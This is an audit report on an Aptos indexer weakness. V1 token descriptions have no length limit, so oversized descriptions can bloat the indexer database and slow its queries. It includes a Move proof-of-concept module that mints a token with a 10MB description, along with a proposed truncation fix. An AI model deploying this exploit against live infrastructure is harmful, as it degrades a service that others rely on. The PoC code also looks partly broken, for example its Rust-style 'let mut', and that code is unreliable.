# Audit Report

## Title
V1 Token Description Field Lacks Length Validation Leading to Indexer Database Resource Exhaustion

## Summary
The Aptos indexer processes V1 token descriptions without length validation or truncation, allowing unbounded text storage in the database. While V2 tokens enforce a 2048-byte limit on-chain, V1 tokens have no such restriction, enabling attackers to create tokens with megabyte-sized descriptions that consume excessive database storage and cause query timeouts.

## Finding Description
The vulnerability exists in the interaction between on-chain V1 token validation and off-chain indexer processing:

**On-Chain V1 Token Creation** - V1 tokens lack description length validation during creation. The `create_tokendata` function validates name, collection, and URI lengths but omits description validation. [1](#0-0) 

This allows creation of tokens with arbitrarily long descriptions (no `MAX_DESCRIPTION_LENGTH` constant exists for V1 tokens unlike V2 tokens). [2](#0-1) 

**Indexer Processing** - The indexer processes V1 token descriptions without truncation, directly cloning the unbounded description field into database models: [3](#0-2) 

Unlike `token_name` and `token_uri` which use truncation functions (`get_name_trunc()`, `get_uri_trunc()`), the description field has no protective truncation: [4](#0-3) 

**Database Schema** - The database schema defines description as unbounded `TEXT NOT NULL`: [5](#0-4) 

**Attack Path:**
1. Attacker creates V1 token with 100MB+ description via `create_tokendata`
2. On-chain validation passes (no description length check)
3. Indexer processes token via `get_v1_from_write_table_item`
4. Full description stored in PostgreSQL database
5. Queries fetching token data experience timeouts
6. Repeated exploitation causes database bloat and indexer degradation

## Impact Explanation
This vulnerability does **NOT** meet Critical, High, or Medium severity criteria per the Aptos bug bounty program because:

- **No funds at risk**: Does not enable theft, freezing, or minting of assets
- **No consensus impact**: Blockchain consensus remains unaffected
- **No blockchain availability impact**: Only indexer infrastructure affected, not the blockchain itself
- **No protocol violations**: The blockchain state remains valid

However, it does cause:
- Excessive database storage consumption (infrastructure resource exhaustion)
- Query timeouts degrading indexer API performance
- Potential indexer service degradation with repeated exploitation

This is classified as **Low Severity** per the bug bounty criteria: "Non-critical implementation bugs" affecting off-chain indexer infrastructure rather than core blockchain security.

## Likelihood Explanation
**Likelihood: High** - Exploitation requires only:
- Standard account with gas fees
- Ability to call `create_tokendata` (public function)
- No special permissions or validator access needed

The attack is:
- Trivial to execute (single transaction)
- Repeatable without restriction
- Undetectable until performance degradation occurs

## Recommendation
Implement defensive truncation in the indexer similar to existing field protections:

```rust
// In v2_token_datas.rs, add description truncation constant
const MAX_DESCRIPTION_LENGTH: usize = 2048; // Match V2 on-chain limit

// Modify get_v1_from_write_table_item to truncate description
description: truncate_str(&token_data.description, MAX_DESCRIPTION_LENGTH),
```

Additionally, consider:
1. Adding database-level `CHECK` constraint for description length
2. Monitoring and alerting on tokens with descriptions >10KB
3. Backfilling existing large descriptions with truncated versions

## Proof of Concept
```move
// Create V1 token with 10MB description
module attacker::exploit {
    use std::string;
    use aptos_token::token;
    
    public entry fun create_bloated_token(creator: &signer) {
        // Create collection first
        token::create_collection(
            creator,
            string::utf8(b"Attack Collection"),
            string::utf8(b"Testing"),
            string::utf8(b"https://example.com"),
            1000,
            vector[false, false, false]
        );
        
        // Create 10MB description by repeating 'A' character
        let mut description_bytes = vector::empty<u8>();
        let mut i = 0;
        while (i < 10_000_000) {  // 10 million bytes = ~10MB
            vector::push_back(&mut description_bytes, 0x41); // 'A'
            i = i + 1;
        };
        let bloated_description = string::utf8(description_bytes);
        
        // Create token with massive description - no on-chain validation will reject this
        token::create_tokendata(
            creator,
            string::utf8(b"Attack Collection"),
            string::utf8(b"Bloated Token"),
            bloated_description,  // 10MB description
            1,
            string::utf8(b"https://example.com"),
            @0x1,
            1,
            1,
            token::create_token_mutability_config(&vector[false, false, false, false, false]),
            vector::empty(),
            vector::empty(),
            vector::empty()
        );
        // This succeeds on-chain and gets indexed with full 10MB description
    }
}
```

---

**Notes:**

This vulnerability is **real but Low severity** as explicitly indicated in the security question. While V1 tokens allow unbounded descriptions that bypass on-chain validation and consume excessive indexer database resources, this affects only off-chain infrastructure performance rather than blockchain security guarantees. The issue does not meet the Critical/High/Medium severity threshold required for the bug bounty program's primary focus areas (consensus, funds, availability of the blockchain itself).

### Citations

**File:** aptos-move/framework/aptos-token/sources/token.move (L1264-1266)
```text
        assert!(name.length() <= MAX_NFT_NAME_LENGTH, error::invalid_argument(ENFT_NAME_TOO_LONG));
        assert!(collection.length() <= MAX_COLLECTION_NAME_LENGTH, error::invalid_argument(ECOLLECTION_NAME_TOO_LONG));
        assert!(uri.length() <= MAX_URI_LENGTH, error::invalid_argument(EURI_TOO_LONG));
```

**File:** aptos-move/framework/aptos-token-objects/sources/token.move (L44-44)
```text
    const MAX_DESCRIPTION_LENGTH: u64 = 2048;
```

**File:** crates/indexer/src/models/token_models/v2_token_datas.rs (L201-201)
```rust
                        description: token_data.description.clone(),
```

**File:** crates/indexer/src/models/token_models/v2_token_utils.rs (L183-189)
```rust
pub struct TokenV2 {
    collection: ResourceReference,
    pub description: String,
    // These are set to private because we should never get name or uri directly
    name: String,
    uri: String,
}
```

**File:** crates/indexer/migrations/2023-04-28-053048_object_token_v2/up.sql (L138-138)
```sql
  description TEXT NOT NULL,
```
